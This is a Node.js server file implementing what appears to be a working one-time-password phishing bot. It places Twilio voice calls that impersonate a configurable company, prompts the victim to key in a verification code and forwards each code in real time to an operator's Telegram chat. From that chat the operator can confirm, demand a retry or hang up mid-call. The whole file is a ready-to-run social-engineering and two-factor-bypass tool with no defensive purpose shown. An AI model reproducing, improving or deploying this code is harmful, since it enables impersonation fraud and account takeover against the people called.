const express = require("express");
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const twilio = require("twilio");

const app = express();
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const PORT = process.env.PORT || 3000;

// ===== ENV =====
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const TWILIO_ACCOUNT_SID = process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID;
const TWILIO_AUTH_TOKEN = process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN;
const TWILIO_NUMBER = process.env.TWILIO_NUMBER;

const BASE_URL = process.env.BASE_URL;

const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);

// ===== SETTINGS =====
let settings = {
  company: "Support",
  digits: 6,
  assistant: 0,
  itemName: "reference number"
};

const assistants = [
  { name: "Nova", voice: "Polly.Joanna" },
  { name: "Lyra", voice: "Polly.Matthew" },
  { name: "Orion", voice: "Polly.Amy" },
  { name: "Astra", voice: "Polly.Brian" },
  { name: "Kairo", voice: "Polly.Justin" },
  { name: "Solara", voice: "Polly.Kendra" }
];

// ===== STATE =====
// calls keyed by CallSid
const calls = new Map();
let lastCaller = null;
let logs = [];
let panelMessageId = null;
let pendingInput = null; // "call", "company", "digits", "assistant", "item"

function assistant() {
  return assistants[settings.assistant] || assistants[0];
}

function pushLog(text) {
  logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
  logs = logs.slice(0, 20);
}

function getOrCreateCall(callSid) {
  if (!callSid) return null;
  if (!calls.has(callSid)) {
    calls.set(callSid, {
      sid: callSid,
      caller: null,
      input: null,
      startedAt: Date.now(),
      status: "Idle",
      assistantIndex: settings.assistant
    });
  }
  return calls.get(callSid);
}

function callTimerText(call) {
  if (!call || !call.startedAt) return "00:00";
  const total = Math.floor((Date.now() - call.startedAt) / 1000);
  const mm = String(Math.floor(total / 60)).padStart(2, "0");
  const ss = String(total % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

function sortedCalls() {
  return Array.from(calls.values()).sort((a, b) => (b.startedAt || 0) - (a.startedAt || 0));
}

// ===== TELEGRAM =====
async function tg(method, data) {
  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
  return res.json();
}

async function tgSend(text, buttons = null) {
  const body = {
    chat_id: CHAT_ID,
    text
  };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  return tg("sendMessage", body);
}

async function tgEdit(messageId, text, buttons = null) {
  const body = {
    chat_id: CHAT_ID,
    message_id: messageId,
    text
  };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  return tg("editMessageText", body);
}

async function tgAnswerCallback(callbackQueryId, text = "") {
  try {
    await tg("answerCallbackQuery", {
      callback_query_id: callbackQueryId,
      text
    });
  } catch {}
}

// ===== PANEL =====
function panelButtons() {
  return [
    [
      { text: "✔ Confirm", callback_data: "confirm" },
      { text: "🔁 Retry", callback_data: "retry" }
    ],
    [
      { text: "⛔ Hang Up", callback_data: "hangup" }
    ],
    [
      { text: "📞 Call Last", callback_data: "calllast" },
      { text: "📲 Call", callback_data: "call" }
    ],
    [
      { text: "📊 Status", callback_data: "status" },
      { text: "📜 Logs", callback_data: "logs" }
    ]
  ];
}

function panelText() {
  const active = sortedCalls().slice(0, 6);

  let lines = ["📞 LIVE CALLS", ""];

  if (!active.length) {
    lines.push("No active calls");
  } else {
    active.forEach((call, index) => {
      lines.push(`${index + 1}) ${call.status}`);
      lines.push(`Caller: ${call.caller || "Unknown"}`);
      lines.push(`${settings.itemName}: ${call.input || "waiting"}`);
      lines.push(`Time: ${callTimerText(call)}`);
      lines.push("");
    });
  }

  lines.push(`Company: ${settings.company}`);
  lines.push(`Digits: ${settings.digits}`);
  lines.push(`Assistant: ${assistant().name}`);
  lines.push(`Item: ${settings.itemName}`);

  return lines.join("\n");
}

async function updatePanel(forceNew = false) {
  try {
    const text = panelText();
    const buttons = panelButtons();

    if (!panelMessageId || forceNew) {
      const msg = await tgSend(text, buttons);
      if (msg && msg.result && msg.result.message_id) {
        panelMessageId = msg.result.message_id;
      }
      return;
    }

    await tgEdit(panelMessageId, text, buttons);
  } catch {}
}

// ===== TWILIO CALL CONTROL =====
async function startCall(number) {
  if (!number) return;

  await client.calls.create({
    url: `${BASE_URL}/ivr`,
    to: number,
    from: TWILIO_NUMBER,
    statusCallback: `${BASE_URL}/call-status`,
    statusCallbackEvent: ["initiated", "ringing", "answered", "completed"],
    statusCallbackMethod: "POST"
  });

  pushLog(`Outbound call started to ${number}`);
}

function newestActiveCall() {
  const active = sortedCalls().find(c => c.status !== "Ended");
  return active || null;
}

async function updateLiveCallTwiml(callSid, twiml) {
  if (!callSid) return;
  await client.calls(callSid).update({ twiml });
}

async function endLiveCallImmediately(callSid) {
  if (!callSid) return;
  await client.calls(callSid).update({
    twiml: `<Response><Hangup/></Response>`
  });
}

// ===== ROOT =====
app.get("/", (req, res) => {
  res.send("Server running");
});

app.get("/ivr", (req, res) => {
  res.type("text/xml");
  res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
});

// ===== CALL STATUS WEBHOOK =====
app.post("/call-status", async (req, res) => {
  try {
    const status = req.body.CallStatus;
    const from = req.body.From;
    const sid = req.body.CallSid;

    const call = getOrCreateCall(sid);
    if (call) {
      if (from) call.caller = from;

      if (status === "ringing") {
        call.status = "Ringing";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "in-progress" || status === "answered") {
        call.status = "Answered";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "completed") {
        call.status = "Ended";
      }

      updatePanel();
    }
  } catch (e) {
    console.log("call-status error:", e.message);
  }

  res.sendStatus(200);
});

// ===== IVR START =====
app.post("/ivr", async (req, res) => {
  try {
    const sid = req.body.CallSid;
    const from = req.body.From;

    const call = getOrCreateCall(sid);
    if (call) {
      call.caller = from || call.caller;
      call.assistantIndex = settings.assistant;
      call.status = "Answered";
      if (!call.startedAt) call.startedAt = Date.now();
    }

    lastCaller = from || lastCaller;
    updatePanel();

    res.type("text/xml");
    res.send(`
<Response>
<Say voice="${assistant().voice}">
Hello im calling from ${settings.company}. Please enter your ${settings.digits} digit ${settings.itemName}.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="8"/>
<Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`);
  } catch (e) {
    console.log("/ivr error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ===== INPUT RECEIVED =====
app.post("/input", async (req, res) => {
  try {
    const digits = req.body.Digits;
    const caller = req.body.From;
    const sid = req.body.CallSid;

    const call = getOrCreateCall(sid);
    if (call) {
      call.caller = caller;
      call.input = digits;
      call.status = "Answered";
      call.startedAt = Date.now();
    }

    lastCaller = caller;
    pushLog(`${caller} : ${digits}`);

    res.type("text/xml");
    res.send(`
<Response>
<Say voice="${assistant().voice}">
Please wait while we review your ${settings.itemName}.
</Say>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);

    setTimeout(async () => {
      try {
        await tgSend(`📞 INPUT RECEIVED

Caller: ${caller}
${settings.itemName}: ${digits}`);
        await updatePanel();
      } catch (e) {
        console.log("post-input telegram error:", e.message);
      }
    }, 0);
  } catch (e) {
    console.log("/input error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ===== HOLD LOOP =====
app.post("/hold", (req, res) => {
  res.type("text/xml");
  res.send(`
<Response>
<Pause length="10"/>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);
});

// ===== TELEGRAM WEBHOOK =====
app.post("/telegram", async (req, res) => {
  const update = req.body;

  try {
    if (update.callback_query) {
      const action = update.callback_query.data;
      const callbackId = update.callback_query.id;
      const call = newestActiveCall();
      const callSid = call ? call.sid : null;

      if (action === "confirm") {
        if (callSid) {
          await updateLiveCallTwiml(callSid, `
<Response>
<Say voice="${assistant().voice}">
Thank you. Your ${settings.itemName} has been confirmed. Have a great day.
</Say>
<Hangup/>
</Response>
`);
          call.status = "Ended";
          pushLog("Confirmed");
          await updatePanel();
        }
        await tgAnswerCallback(callbackId, "Confirmed");
      }

      if (action === "retry") {
        if (callSid) {
          await updateLiveCallTwiml(callSid, `
<Response>
<Say voice="${assistant().voice}">
Please re-enter your ${settings.itemName}.
</Say>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="8"/>
</Response>
`);
          call.input = null;
          pushLog("Retry requested");
          await updatePanel();
        }
        await tgAnswerCallback(callbackId, "Retry sent");
      }

      if (action === "hangup") {
        if (callSid) {
          await endLiveCallImmediately(callSid);
          call.status = "Ended";
          pushLog("Hung up");
          await updatePanel();
        }
        await tgAnswerCallback(callbackId, "Hung up");
      }

      if (action === "calllast") {
        if (lastCaller) {
          await startCall(lastCaller);
          await tgSend(`📞 Calling last caller ${lastCaller}`);
        } else {
          await tgSend("No last caller available");
        }
        await tgAnswerCallback(callbackId, "Calling");
      }

      if (action === "call") {
        pendingInput = "call";
        await tgSend("Send the number to call.\nExample:\n/call +447123456789");
        await tgAnswerCallback(callbackId, "Waiting for number");
      }

      if (action === "status") {
        await updatePanel();
        await tgAnswerCallback(callbackId, "Panel refreshed");
      }

      if (action === "logs") {
        let text = "📜 Logs\n\n";
        logs.forEach(l => {
          text += l + "\n";
        });
        await tgSend(text);
        await tgAnswerCallback(callbackId, "Logs sent");
      }
    }

    if (update.message && update.message.text) {
      const text = update.message.text.trim();

      if (pendingInput === "call" && !text.startsWith("/")) {
        pendingInput = null;
        await startCall(text);
        await tgSend(`📞 Calling ${text}`);
        return res.sendStatus(200);
      }

      if (pendingInput === "company" && !text.startsWith("/")) {
        pendingInput = null;
        settings.company = text;
        await tgSend(`🏢 Company set to ${settings.company}`);
        await updatePanel();
        return res.sendStatus(200);
      }

      if (pendingInput === "digits" && !text.startsWith("/")) {
        pendingInput = null;
        const d = parseInt(text, 10);
        if (d >= 2 && d <= 10) {
          settings.digits = d;
          await tgSend(`✅ ${d} digits set`);
          await updatePanel();
        } else {
          await tgSend("Use a number from 2 to 10");
        }
        return res.sendStatus(200);
      }

      if (pendingInput === "assistant" && !text.startsWith("/")) {
        pendingInput = null;
        const a = parseInt(text, 10);
        if (a >= 1 && a <= assistants.length) {
          settings.assistant = a - 1;
          await tgSend(`🎙 ${assistant().name} assistant set`);
          await updatePanel();
        } else {
          await tgSend("Use a number from 1 to 6");
        }
        return res.sendStatus(200);
      }

      if (pendingInput === "item" && !text.startsWith("/")) {
        pendingInput = null;
        settings.itemName = text;
        await tgSend(`📝 Item set to ${settings.itemName}`);
        await updatePanel();
        return res.sendStatus(200);
      }

      if (text === "/panel" || text === "/menu" || text === "/status") {
        panelMessageId = null;
        await updatePanel(true);
      }

      if (text === "/help") {
        await tgSend(`🤖 Help

/panel - open control panel
/menu - open control panel
/status - refresh control panel
/logs - show logs
/call +number - call a number
/calllast - call last caller
/digits 6 - set digits
/assistant 2 - set assistant
/company Apple Support - set company
/item booking code - set input label
/settings - show current settings
/commands - show command list`);
      }

      if (text === "/settings") {
        await tgSend(`⚙ Current Settings

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistant().name}
Item: ${settings.itemName}`);
      }

      if (text === "/commands") {
        await tgSend(`⚙ Commands

/panel
/menu
/status
/logs
/call +number
/calllast
/digits X
/assistant X
/company NAME
/item NAME
/help
/settings`);
      }

      if (text.startsWith("/call ")) {
        const number = text.split(" ")[1];
        if (!number) {
          await tgSend("Usage: /call +447xxxxxxxx");
        } else {
          await startCall(number);
          await tgSend(`📞 Calling ${number}`);
        }
      }

      if (text === "/calllast") {
        if (!lastCaller) {
          await tgSend("No last caller available");
        } else {
          await startCall(lastCaller);
          await tgSend(`📞 Calling ${lastCaller}`);
        }
      }

      if (text.startsWith("/digits")) {
        const d = parseInt(text.split(" ")[1], 10);
        if (d >= 2 && d <= 10) {
          settings.digits = d;
          await tgSend(`✅ ${d} digits set`);
          await updatePanel();
        } else {
          await tgSend("Use /digits 2 to 10");
        }
      }

      if (text.startsWith("/assistant")) {
        const a = parseInt(text.split(" ")[1], 10);
        if (a >= 1 && a <= assistants.length) {
          settings.assistant = a - 1;
          await tgSend(`🎙 ${assistant().name} assistant set`);
          await updatePanel();
        } else {
          await tgSend("Use /assistant 1 to 6");
        }
      }

      if (text.startsWith("/company")) {
        const name = text.replace("/company", "").trim();
        if (!name) {
          await tgSend("Usage: /company Apple Support");
        } else {
          settings.company = name;
          await tgSend(`🏢 Company set to ${settings.company}`);
          await updatePanel();
        }
      }

      if (text.startsWith("/item")) {
        const name = text.replace("/item", "").trim();
        if (!name) {
          await tgSend("Usage: /item booking code");
        } else {
          settings.itemName = name;
          await tgSend(`📝 Item set to ${settings.itemName}`);
          await updatePanel();
        }
      }

      if (text === "/logs") {
        let textOut = "📜 Logs\n\n";
        logs.forEach(l => {
          textOut += l + "\n";
        });
        await tgSend(textOut);
      }
    }
  } catch (e) {
    console.log("/telegram error:", e.message);
  }

  res.sendStatus(200);
});

// ===== LIVE PANEL UPDATE =====
setInterval(() => {
  if (panelMessageId) {
    updatePanel();
  }
}, 1000);

app.listen(PORT, () => {
  console.log("Server started");
});
